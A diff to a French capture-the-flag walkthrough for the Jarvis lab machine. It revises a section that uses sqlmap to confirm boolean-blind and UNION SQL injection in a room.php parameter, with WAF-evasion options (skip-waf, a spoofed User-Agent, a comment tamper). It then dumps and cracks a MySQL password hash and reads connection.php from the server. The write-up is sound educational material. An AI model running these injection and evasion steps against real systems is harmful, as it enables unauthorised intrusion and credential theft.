@@ -656,21 +656,24 @@ sqlmap \
   --risk=1 \
   --threads=1 \
   --delay=1 \
+  --skip-waf \
   --batch \
-  --flush-session  
+  --flush-session
 ```
 
 L’option `-p cod` demande à `sqlmap` de tester uniquement le paramètre `cod`.
 
-L’option `--dbms=MySQL` limite les charges utiles à celles compatibles avec MySQL, tandis que `--technique=B` restreint la recherche aux injections SQL booléennes.
+L’option `--dbms=MySQL` limite les charges utiles à celles compatibles avec MySQL et MariaDB, tandis que `--technique=B` restreint la recherche aux injections SQL de type booléen.
 
 Les options `--level=1` et `--risk=1` conservent les niveaux de test les plus bas. Elles limitent le nombre de charges utiles testées et évitent les variantes les plus intrusives.
 
 Les options `--threads=1` et `--delay=1` imposent l’utilisation d’un seul thread et ajoutent une seconde d’attente entre les requêtes. Elles permettent ainsi de réduire le risque de bannissement par le mécanisme de protection détecté pendant l’énumération.
 
+L’option `--skip-waf` empêche `sqlmap` d’exécuter son test préalable de détection des pare-feux applicatifs. Ce contrôle s’est révélé particulièrement reconnaissable et déclenchait immédiatement IronWAF. Cette option ne désactive pas le WAF : elle évite seulement ce test préliminaire.
+
 L’option `--batch` accepte automatiquement les réponses par défaut proposées par `sqlmap`.
 
-Enfin, `--flush-session` efface les résultats précédemment enregistrés par l’outil pour forcer une nouvelle détection.
+Enfin, `--flush-session` efface les résultats précédemment enregistrés par l’outil afin de forcer une nouvelle détection.
 
 > **Remarque sur les blocages de `sqlmap`**
 >
@@ -704,106 +707,84 @@ Enfin, `--flush-session` efface les résultats précédemment enregistrés par l
 >
 > Cette commande supprime également les fichiers déjà récupérés par `sqlmap`. Copie-les auparavant si tu souhaites les conserver.
 
-Voici le résultat de cette exécution :
+Malgré la limitation à la technique booléenne, cette première tentative reste perturbée par IronWAF. Plusieurs réponses `404` sont retournées pendant les tests, ce qui empêche `sqlmap` de valider définitivement le point d’injection.
+
+La situation s’améliore lorsque tu remplaces le User-Agent par celui d’un navigateur Firefox sous Windows :
 
 ```bash
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.10.6#stable}
-|_ -| . [,]     | .'| . |
-|___|_  ["]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ [15:32:54 /date]/
-
-[15:32:55] [INFO] flushing session file
-[15:32:55] [INFO] testing connection to the target URL
-you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7b19b566d6d...4fp1sjs8l1'). Do you want to use those [Y/n] Y
-[15:32:56] [INFO] checking if the target is protected by some kind of WAF/IPS
-[15:32:57] [INFO] testing if the target URL content is stable
-[15:32:58] [INFO] target URL content is stable
-[15:32:59] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
-[15:33:00] [INFO] testing for SQL injection on GET parameter 'cod'
-[15:33:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[15:33:05] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Suite room is perfect")
-[15:33:05] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
-GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
----
-Parameter: cod (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: cod=2 AND 5607=5607
----
-[15:33:13] [INFO] testing MySQL
-[15:33:14] [INFO] confirming MySQL
-[15:33:18] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian 9 (stretch)
-web application technology: Apache 2.4.25, PHP
-back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
-[15:33:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
-
-[*] ending @ 15:33:19 /date/
+--user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
 ```
 
-Cette fois, l’outil confirme que le paramètre GET `cod` est vulnérable :
+Avec ce User-Agent, `sqlmap` observe le comportement attendu pour une injection booléenne :
 
 ```text
-Parameter: cod (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: cod=2 AND 5607=5607
+GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+(with --string="Suite room is perfect")
 ```
 
-La charge utile générée ajoute une condition toujours vraie :
-
-```text
-cod=2 AND 5607=5607
-```
-
-L’application continue alors de retourner les informations de la chambre. En comparant cette réponse à celles obtenues avec des conditions fausses, `sqlmap` peut distinguer les deux comportements.
-
-Au cours de cette analyse, l’outil identifie également une chaîne caractéristique de la réponse vraie :
+L’outil identifie donc une chaîne caractéristique de la page retournée lorsque la condition injectée est vraie :
 
 ```text
 Suite room is perfect
 ```
 
-La sortie le signale explicitement :
+Cette découverte est importante. `sqlmap` pourra désormais déterminer plus facilement si une condition est vraie ou fausse en vérifiant simplement la présence ou l’absence de cette chaîne dans la réponse HTTP.
 
-```text
-with --string="Suite room is perfect"
-```
+La vérification finale reste toutefois interrompue par une réponse `404` d’IronWAF. `sqlmap` recommande alors notamment l’utilisation d’un script tamper comme `space2comment`.
 
-Tu peux désormais réutiliser ce marqueur dans les commandes suivantes avec l’option :
+Tu testes cette recommandation :
 
 ```bash
---string='Suite room is perfect'
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --level=1 \
+  --risk=1 \
+  --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+  --threads=1 \
+  --delay=1 \
+  --skip-waf \
+  --tamper=space2comment \
+  --batch \
+  --flush-session
 ```
 
-`sqlmap` pourra alors vérifier directement la présence ou l’absence de cette chaîne dans la réponse HTTP pour déterminer si la condition injectée est vraie ou fausse. Ce marqueur sera particulièrement utile pour rendre les prochaines détections et extractions plus stables.
+Le script `space2comment` remplace les espaces présents dans les charges utiles SQL par des commentaires.
 
-L’outil identifie également le système de gestion de base de données utilisé :
+Une charge utile conceptuellement proche de :
+
+```sql
+cod=2 AND 8851=8851
+```
+
+est ainsi transmise sous une forme ressemblant à :
+
+```sql
+cod=2/**/AND/**/8851=8851
+```
+
+Cette transformation modifie la signature de la requête sans changer son sens pour le serveur MySQL.
+
+Cette fois, `sqlmap` parvient à terminer la vérification et confirme l’injection :
 
 ```text
-back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 8851=8851
 ```
 
-L’injection SQL du paramètre `cod` est donc confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
+La sortie précise toutefois que le payload présenté ne montre pas les modifications réellement appliquées par le tamper :
 
-#### Identification de l’utilisateur MySQL
+```text
+changes made by tampering scripts are not included in shown payload content(s)
+```
 
-Après avoir confirmé l’injection SQL, tu cherches maintenant à déterminer quel compte MySQL est utilisé par l’application et surtout à vérifier l’étendue de ses privilèges.
+Le script `space2comment` permet donc de confirmer la vulnérabilité. Il reste néanmoins à vérifier s’il est indispensable ou si la chaîne découverte précédemment suffit à stabiliser la détection.
 
-Cette information est importante, car un compte disposant de privilèges DBA ne se limite pas nécessairement à la lecture des données contenues dans les bases. 
-
-Selon sa configuration, il peut également permettre des actions plus sensibles, comme la lecture de fichiers locaux, l’écriture de fichiers sur le serveur ou encore l’exécution de commandes par l’intermédiaire du SGBD.
-
-Tu ajoutes donc l’option `--is-dba` afin de vérifier si l’utilisateur MySQL courant possède des privilèges administratifs. 
-
-Lors de cette vérification, `sqlmap` affiche également l’identité du compte utilisé dans le contexte de la requête vulnérable.
+Tu relances alors `sqlmap` sans tamper, mais en lui fournissant explicitement le marqueur de réponse vraie :
 
 ```bash
 sqlmap \
@@ -814,148 +795,452 @@ sqlmap \
   --string='Suite room is perfect' \
   --level=1 \
   --risk=1 \
+  --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0' \
   --threads=1 \
   --delay=1 \
+  --skip-waf \
   --batch \
-  --flush-session \
-  --is-dba
+  --flush-session
 ```
 
-Lors de cette vérification, `sqlmap` récupère également l’identité de l’utilisateur courant, ce qui permet d’obtenir les deux informations au cours de la même exécution.
+L’option `--string='Suite room is perfect'` demande à `sqlmap` de considérer la présence de cette chaîne comme le signe d’une réponse vraie.
 
-L’option `--string='Suite room is perfect'` fournit à `sqlmap` un marqueur caractéristique d’une réponse vraie. Cette chaîne avait été repérée lors de la détection précédente, puis vérifiée manuellement dans la page retournée pour `cod=2`. Elle permet de stabiliser la comparaison des réponses malgré le mécanisme de protection du site.
+Cette fois, l’outil va jusqu’au terme de la vérification sans utiliser de script tamper :
 
-L’extraction reste relativement lente, car l’injection est de type **boolean-based blind**. `sqlmap` doit reconstruire les informations caractère par caractère en envoyant plusieurs conditions vraies ou fausses.
-
-La sortie permet d’obtenir les deux résultats suivants :
-
-```
-current user: 'DBadmin@localhost'
-current user is DBA: True
+```text
+GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
 ```
 
-Le compte MySQL utilisé par l’application est donc `DBadmin@localhost`. Le suffixe `@localhost` indique que ce compte se connecte localement au serveur de base de données.
+Il confirme ensuite définitivement que le paramètre est vulnérable :
 
-Son nom laissait déjà penser qu’il pouvait disposer de privilèges élevés, mais le résultat suivant en apporte cette fois la confirmation :
-
-```
-current user is DBA: True
+```text
+GET parameter 'cod' is vulnerable
 ```
 
-`sqlmap` considère donc que le compte courant dispose de privilèges administratifs sur le SGBD.
+Le point d’injection identifié est le suivant :
 
-Ce résultat ne garantit pas à lui seul toutes les actions possibles sur le système de fichiers, mais il justifie de tester des fonctions plus sensibles, notamment la lecture et l’écriture de fichiers.
+```text
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 1515=1515
+```
 
-Cette situation ouvre des possibilités d’exploitation plus intéressantes que la simple lecture des données de la base.
+La charge utile générée ajoute une égalité toujours vraie :
 
-#### Lecture du fichier `connection.php`
+```text
+cod=2 AND 1515=1515
+```
 
-Les privilèges DBA du compte `DBadmin@localhost` peuvent offrir des possibilités qui dépassent l’énumération des données contenues dans MySQL. Tu peux notamment vérifier si ce compte permet de lire des fichiers locaux accessibles au serveur de base de données.
+L’application continue alors d’afficher les informations de la chambre. Grâce au marqueur fourni avec `--string`, `sqlmap` peut comparer cette réponse aux pages obtenues avec des conditions fausses et confirmer que le contenu retourné dépend bien du résultat de l’expression injectée.
 
-Comme l’application est développée en PHP, tu recherches un fichier susceptible de contenir les paramètres de connexion à MySQL. 
+L’outil identifie également le système de gestion de base de données utilisé :
 
-Le nom `connection.php` et son emplacement dans `/var/www/html` constituent ici une hypothèse cohérente avec l’organisation du site observée pendant l’énumération.
+```text
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+```
 
-Tu tentes donc de lire `/var/www/html/connection.php`.
+L’injection SQL du paramètre `cod` est donc confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
+
+Les essais montrent également que le tamper `space2comment` peut faciliter le passage à travers IronWAF, mais qu’il n’est pas indispensable ici. La combinaison suivante suffit à obtenir une détection stable :
+
+```text
+User-Agent Firefox Windows
+--skip-waf
+--string='Suite room is perfect'
+```
+
+Le User-Agent Firefox rend les requêtes moins reconnaissables que celles envoyées avec la signature par défaut de `sqlmap`, `--skip-waf` évite le test préalable qui déclenche IronWAF, et `--string` fournit un marqueur fiable pour distinguer les réponses vraies des réponses fausses.
+
+#### Recherche d’une technique d’injection plus efficace
+
+L’injection de type **boolean-based blind** est désormais confirmée et peut être utilisée pour récupérer des informations depuis le serveur MySQL.
+
+Cette technique est toutefois relativement lente. Les données recherchées ne sont pas directement affichées dans la réponse HTTP : `sqlmap` doit les reconstruire caractère par caractère en envoyant de nombreuses conditions vraies ou fausses.
+
+Cette méthode est donc efficace pour confirmer la vulnérabilité, mais elle risque de rendre les prochaines opérations particulièrement longues, notamment lorsqu’il faudra récupérer des identifiants ou lire des fichiers.
+
+Avant de poursuivre l’exploitation, tu vérifies donc si le paramètre `cod` permet également une injection de type **UNION query**.
+
+Lorsqu’elle est exploitable, cette technique permet d’ajouter une seconde requête SQL à celle de l’application et de retourner directement ses résultats dans la page. Elle est généralement beaucoup plus rapide qu’une injection boolean-based blind.
+
+Tu demandes donc à `sqlmap` de rechercher uniquement cette technique :
 
 ```bash
 sqlmap \
   -u 'http://jarvis.htb/room.php?cod=2' \
   -p cod \
   --dbms=MySQL \
-  --technique=B \
+  --technique=U \
   --string='Suite room is perfect' \
+  --level=1 \
+  --risk=1 \
   --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0' \
   --threads=1 \
   --delay=1 \
+  --skip-waf \
   --batch \
-  --flush-session \
-  --no-cast \
-  --file-read=/var/www/html/connection.php
+  --flush-session
 ```
 
-Ce qui te donne :
+L’option `--technique=U` limite cette nouvelle détection aux injections SQL de type **UNION query**.
+
+Tu conserves les paramètres qui ont permis de stabiliser la détection précédente face à IronWAF :
+
+```text
+--string='Suite room is perfect'
+User-Agent Firefox Windows
+--skip-waf
+```
+
+L’option `--flush-session` est également conservée afin de forcer `sqlmap` à effectuer une nouvelle détection, sans réutiliser automatiquement le point d’injection booléen déjà enregistré.
+
+Voici le résultat :
 
 ```bash
-         ___
+        ___
        __H__
- ___ ___[']_____ ___ ___  {1.10.6#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
+ ___ ___[)]_____ ___ ___  {1.10.6#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 12:23:51 /2026-07-17/
+[*] starting @ 10:22:28 /2026-07-18/
 
-[12:23:51] [INFO] flushing session file
-[12:23:51] [INFO] testing connection to the target URL
-[12:23:52] [INFO] testing if the provided string is within the target URL page content
-you have not declared cookie(s), while server wants to set its own ('PHPSESSID=giq9g675gsv...pqr36ctmf0'). Do you want to use those [Y/n] Y
-[12:23:53] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
-[12:23:54] [INFO] testing for SQL injection on GET parameter 'cod'
-[12:23:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[12:23:59] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
-[12:23:59] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
+[10:22:28] [INFO] flushing session file
+[10:22:28] [INFO] testing connection to the target URL
+[10:22:29] [INFO] testing if the provided string is within the target URL page content
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7i2k693g3tn...6cnp5l6as2'). Do you want to use those [Y/n] Y
+[10:22:30] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
+[10:22:31] [INFO] testing for SQL injection on GET parameter 'cod'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[10:22:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[10:22:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[10:22:39] [INFO] target URL appears to have 7 columns in query
+[10:22:54] [WARNING] reflective value(s) found and filtering out
+[10:22:54] [INFO] GET parameter 'cod' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
+[10:22:54] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
 GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 30 HTTP(s) requests:
 ---
 Parameter: cod (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: cod=2 AND 9800=9800
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-9360 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a767871,0x774678765472776a7a626a7076514670776f64626d546b734e707254504a465a54616f66464e4d4b,0x7170767a71),NULL,NULL-- -
 ---
-[12:24:07] [INFO] testing MySQL
-[12:24:08] [INFO] confirming MySQL
-[12:24:12] [INFO] the back-end DBMS is MySQL
+[10:23:02] [INFO] testing MySQL
+[10:23:03] [INFO] confirming MySQL
+[10:23:07] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Debian 9 (stretch)
 web application technology: Apache 2.4.25, PHP
 back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
-[12:24:13] [INFO] fingerprinting the back-end DBMS operating system
-[12:24:14] [INFO] the back-end DBMS operating system is Linux
-[12:24:14] [INFO] fetching file: '/var/www/html/connection.php'
-[12:24:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-[12:24:14] [INFO] retrieved: 3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C6928273132372E302E302E31272C27444261646D696E272C27696D697373796F75272C27686F74656C27293B0A3F3E0A
+[10:23:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 10:23:08 /2026-07-18/
+```
+
+La sortie confirme que le paramètre `cod` est également vulnérable à une injection SQL de type **UNION query** :
+
+```text
+Parameter: cod (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-9360 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(...),NULL,NULL-- -
+```
+
+Pour construire une requête UNION valide, `sqlmap` doit d’abord déterminer le nombre de colonnes retournées par la requête originale.
+
+L’outil constate que la technique `ORDER BY` peut être utilisée pour effectuer cette vérification :
+
+```text
+'ORDER BY' technique appears to be usable
+```
+
+Il identifie ensuite une requête composée de sept colonnes :
+
+```text
+target URL appears to have 7 columns in query
+```
+
+Le payload généré respecte donc cette structure :
+
+```sql
+UNION ALL SELECT
+    NULL,
+    NULL,
+    NULL,
+    NULL,
+    <donnée injectée>,
+    NULL,
+    NULL
+```
+
+La valeur contrôlée est placée dans la cinquième colonne, ce qui indique que cette position permet à `sqlmap` de retrouver le résultat injecté dans la réponse HTTP.
+
+La valeur négative utilisée pour le paramètre `cod` :
+
+```text
+cod=-9360
+```
+
+évite que la première partie de la requête retourne une chambre existante. Le résultat produit par la partie `UNION SELECT` peut ainsi apparaître seul dans la page et être identifié plus facilement.
+
+`sqlmap` termine ensuite le contrôle du faux positif et confirme définitivement la vulnérabilité :
+
+```text
+GET parameter 'cod' is vulnerable
+```
+
+L’application est donc vulnérable à deux techniques d’injection SQL :
+
+```text
+boolean-based blind
+UNION query
+```
+
+La technique booléenne reste exploitable, mais elle nécessite de reconstruire les données caractère par caractère à l’aide de nombreuses requêtes.
+
+L’injection UNION permet au contraire de retourner directement les résultats dans la réponse HTTP. Elle est donc beaucoup plus rapide et mieux adaptée à la suite de l’exploitation.
+
+Tu conserves désormais cette technique, beaucoup plus rapide que l’injection boolean-based blind.
+
+### Exploitation de l'injection SQLi Union
+
+#### Recherche des mots de passe MySQL
+
+L’injection UNION étant désormais confirmée, tu l’utilises pour rechercher les mots de passe associés aux comptes MySQL accessibles depuis la session vulnérable.
+
+Tu relances `sqlmap` avec l’option `--passwords` :
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=U \
+  --string='Suite room is perfect' \
+  --level=1 \
+  --risk=1 \
+  --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+  --threads=1 \
+  --delay=1 \
+  --skip-waf \
+  --batch \
+  --passwords
+```
+
+L’option `--passwords` demande à `sqlmap` de récupérer les comptes du SGBD et leurs éventuels mots de passe ou hash d’authentification.
+
+Comme le point d’injection UNION est déjà enregistré dans la session, il n’est plus nécessaire d’utiliser `--flush-session`. `sqlmap` peut réutiliser directement la technique précédemment confirmée.
+
+Voici la réponse :
+
+```bash
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.6#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:34:01 /2026-07-18/
+
+[10:34:01] [INFO] testing connection to the target URL
+[10:34:02] [INFO] testing if the provided string is within the target URL page content
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=0io8q7tem4v...9ovuk5t127'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-9360 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a767871,0x774678765472776a7a626a7076514670776f64626d546b734e707254504a465a54616f66464e4d4b,0x7170767a71),NULL,NULL-- -
+---
+[10:34:02] [INFO] testing MySQL
+[10:34:02] [INFO] confirming MySQL
+[10:34:05] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[10:34:05] [INFO] fetching database users password hashes
+[10:34:07] [WARNING] reflective value(s) found and filtering out
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
+[10:34:10] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[10:34:10] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[10:34:10] [INFO] starting dictionary-based cracking (mysql_passwd)
+[10:34:10] [INFO] starting 4 processes 
+[10:34:12] [INFO] cracked password 'imissyou' for user 'DBadmin'                      
+database management system users password hashes:                                     
+[*] DBadmin [1]:
+    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+    clear-text password: imissyou
+
+[10:34:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 10:34:13 /2026-07-18/
+```
+
+La session enregistrée est correctement réutilisée :
+
+```text
+sqlmap resumed the following injection point(s) from stored session:
+```
+
+`sqlmap` reprend donc directement l’injection UNION précédemment confirmée, sans recommencer toute la détection.
+
+L’outil récupère ensuite les hash associés aux comptes MySQL :
+
+```text
+[INFO] fetching database users password hashes
+```
+
+Un seul compte est identifié :
+
+```text
+DBadmin
+```
+
+Le hash récupéré est le suivant :
+
+```text
+*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+```
+
+`sqlmap` reconnaît le format du hash MySQL et propose de lancer une attaque par dictionnaire :
+
+```text
+using hash method 'mysql_passwd'
+```
+
+Tu choisis le dictionnaire fourni par défaut avec l’outil. Quelques secondes plus tard, le mot de passe est retrouvé :
+
+```text
+cracked password 'imissyou' for user 'DBadmin'
+```
+
+Le résultat final est donc :
+
+```text
+Utilisateur MySQL : DBadmin
+Mot de passe       : imissyou
+```
+
+L’injection UNION permet ainsi de récupérer rapidement les informations d’authentification du compte MySQL utilisé par l’application.
+
+L’énumération avait également révélé la présence d’un fichier nommé `connection.php`. Dans une application PHP, un fichier portant ce nom est susceptible de contenir les paramètres utilisés pour établir la connexion à la base de données. Il constitue donc une cible intéressante à lire.
+
+#### Lecture du fichier `connection.php`
+
+Tu réutilises maintenant l’injection UNION déjà enregistrée par `sqlmap` et ajoutes l’option `--file-read` :
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=U \
+  --string='Suite room is perfect' \
+  --level=1 \
+  --risk=1 \
+  --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+  --threads=1 \
+  --delay=1 \
+  --skip-waf \
+  --batch \
+  --file-read=/var/www/html/connection.php
+```
+
+L’option `--file-read` demande à `sqlmap` de lire le fichier indiqué depuis le système de fichiers accessible au serveur de base de données.
+
+Il n’est pas nécessaire d’utiliser `--flush-session`, car `sqlmap` peut réutiliser directement le point d’injection UNION déjà confirmé.
+
+Grâce à cette technique, le contenu du fichier peut être récupéré beaucoup plus rapidement qu’avec l’injection boolean-based blind, puisque les données sont directement retournées dans la réponse HTTP.
+
+Ce qui te donne :
+
+```bash
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.6#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:43:24 /2026-07-18/
+
+[10:43:24] [INFO] testing connection to the target URL
+[10:43:25] [INFO] testing if the provided string is within the target URL page content
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=9u3bp63kod1...c9dcla8ec7'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-9360 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a767871,0x774678765472776a7a626a7076514670776f64626d546b734e707254504a465a54616f66464e4d4b,0x7170767a71),NULL,NULL-- -
+---
+[10:43:25] [INFO] testing MySQL
+[10:43:25] [INFO] confirming MySQL
+[10:43:28] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[10:43:28] [INFO] fingerprinting the back-end DBMS operating system
+[10:43:29] [WARNING] reflective value(s) found and filtering out
+[10:43:29] [INFO] the back-end DBMS operating system is Linux
+[10:43:29] [INFO] fetching file: '/var/www/html/connection.php'
 do you want confirmation that the remote file '/var/www/html/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
-[12:37:02] [INFO] retrieved: 75
-[12:37:16] [INFO] the local file '/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php' and the remote file '/var/www/html/connection.php' have the same size (75 B)
+[10:43:31] [INFO] the local file '/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php' and the remote file '/var/www/html/connection.php' have the same size (75 B)
 files saved to [1]:
 [*] /home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php (same file)
 
-[12:37:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+[10:43:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
 
-[*] ending @ 12:37:16 /2026-07-17/
+[*] ending @ 10:43:31 /2026-07-18/
 ```
 
 
 
-Comme l’injection est de type **boolean-based blind**, le contenu du fichier n’est pas retourné directement par l’application. `sqlmap` doit reconstruire les données à partir d’une succession de conditions vraies et fausses.
+La session enregistrée est correctement réutilisée :
 
-Le fichier est d’abord récupéré sous la forme d’une chaîne hexadécimale :
-
-```
-3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C6928273132372E302E302E31272C27444261646D696E272C27696D697373796F75272C27686F74656C27293B0A3F3E0A
+```text
+sqlmap resumed the following injection point(s) from stored session:
 ```
 
-Cette chaîne représente les octets du fichier sous forme hexadécimale. Par exemple, `3C3F706870` correspond au début `<?php`.
+`sqlmap` reprend donc directement l’injection UNION déjà confirmée, sans recommencer toute la phase de détection.
 
-Après l’extraction, `sqlmap` vérifie la taille du fichier distant et la compare à celle de la copie enregistrée localement :
+L’outil tente ensuite de lire le fichier demandé :
 
+```text
+[INFO] fetching file: '/var/www/html/connection.php'
 ```
+
+Quelques secondes plus tard, il confirme que le fichier distant et sa copie locale possèdent exactement la même taille :
+
+```text
 the local file '/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php' and the remote file '/var/www/html/connection.php' have the same size (75 B)
 ```
 
-Les deux fichiers possèdent une taille identique de `75` octets. L’extraction est donc complète.
+La lecture est donc complète. Le fichier est enregistré localement ici :
 
-Le fichier récupéré est enregistré dans le répertoire de sortie de `sqlmap` :
-
-```
+```text
 /home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php
 ```
 
 Tu peux afficher son contenu avec :
 
-```
+```bash
 cat ~/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php
 ```
 
@@ -967,44 +1252,38 @@ $connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
 ?>
 ```
 
-Tu obtiens ainsi les paramètres utilisés par l’application pour se connecter à MySQL :
